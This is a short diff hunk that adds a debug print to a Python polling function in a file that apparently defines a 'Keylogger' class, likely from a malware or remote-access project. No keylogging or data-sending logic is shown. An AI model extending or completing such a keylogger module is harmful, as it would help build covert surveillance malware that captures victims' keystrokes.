@@ -24,6 +24,7 @@ def run(**args):
     while True:
         time.sleep(30)
         if return_msg != "":
+            print("returnedsomething")
             return return_msg
 
 class Keylogger:
